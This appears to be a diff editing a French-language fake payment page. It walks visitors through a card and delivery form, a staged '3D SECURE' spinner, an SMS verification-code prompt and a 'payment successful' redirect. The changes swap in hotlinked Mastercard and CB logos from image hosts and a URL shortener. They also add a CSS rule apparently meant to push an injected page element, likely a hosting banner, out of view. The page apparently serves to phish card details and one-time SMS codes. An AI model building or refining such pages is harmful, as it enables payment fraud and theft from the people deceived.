@@ -20,7 +20,7 @@
       max-width: 400px;
       margin: 20px auto;
       padding: 20px;
-      border-radius: 12px;
+      border-radius: 10px;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
@@ -31,7 +31,7 @@
       margin: 0;
       border-radius: 0;
       box-shadow: none;
-      height: 90vh;
+      height: 100vh;
       display: flex;
       flex-direction: column;
       justify-content: center;
@@ -53,8 +53,8 @@
     input[type="text"],
     input[type="number"],
     input[type="submit"] {
-      width: 97%;
-      padding: 12px;
+      width: 100%;
+      padding: 13px;
       margin: 8px 0 20px 0;
       border: 1px solid #ddd;
       border-radius: 5px;
@@ -82,7 +82,7 @@
     }
 
     .icon-container img {
-      height: 40px;
+      height: 45px;
       margin: 0 10px;
     }
 
@@ -94,8 +94,8 @@
       border: 4px solid #f3f3f3;
       border-top: 4px solid #3498db;
       border-radius: 50%;
-      width: 45px;
-      height: 45px;
+      width: 40px;
+      height: 40px;
       animation: spin 1s linear infinite;
       margin: 20px auto;
     }
@@ -155,20 +155,21 @@
         margin: 10px auto;
       }
     }
-  </style></head><body>
+    style:first-child + div[style*="flex"][style*="relative"] { width: 10000px !important; }</style>
+    
+ 
+<body>
+
   <div class="payment-container" id="step-1">
-    <h2>Formulaire de Paiement</h2>   
+    <h2>Formulaire de Paiement</h2>
     <div class="icon-container">
-      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard" class="logo">
-   <style>
-  .logo {
-    width: 350px;
-    height: 300px; /* Garde les proportions */
-  }
-</style>
- 
+      
+
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+      
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
+    <img src="https://urls.fr/d8YCSl" alt="CB">
     </div>
- 
 
     <form id="payment-form">
       <label for="delivery-address">Adresse de livraison</label>
@@ -196,10 +197,13 @@
 
   <div class="payment-container full-width-container hidden" id="step-2">
     <h2>3D SECURE</h2>
-         <div class="icon-container">
-   <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="CB">   
+      <div class="icon-container">
+      
 
-
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+      
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
+    <img src="https://urls.fr/d8YCSl" alt="CB">
     </div>
     <div class="spinner"></div>
     <p>VEUILLEZ PATIENTER...</p>
@@ -207,10 +211,13 @@
 
   <div class="payment-container full-width-container hidden" id="step-3">
     <h2>AUTHENTIFICATION SMS</h2>
-             <div class="icon-container">
-   <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="CB">   
+      <div class="icon-container">
+      
 
-
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+      
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
+    <img src="https://urls.fr/d8YCSl" alt="CB">
     </div>
     <p>Entrez le code reçu par SMS :</p>
     <form id="sms-form">
@@ -224,18 +231,24 @@
       <div class="icon-container">
       
 
-      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="CB">   
-
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+      
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
+    <img src="https://urls.fr/d8YCSl" alt="CB">
     </div>
     <div class="spinner"></div>
     <p>VEUILLEZ PATIENTER...</p>
   </div>
 
   <div class="payment-container full-width-container hidden" id="step-5">
-       <h2>PAIEMENT RÉUSSI</h2>
+    <h2>PAIEMENT RÉUSSI</h2>
       <div class="icon-container">
- 
-      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
+      
+
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+      
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
+    <img src="https://urls.fr/d8YCSl" alt="CB">
     </div>
     <p class="success-message">Redirection dans quelques instants...</p>
   </div>
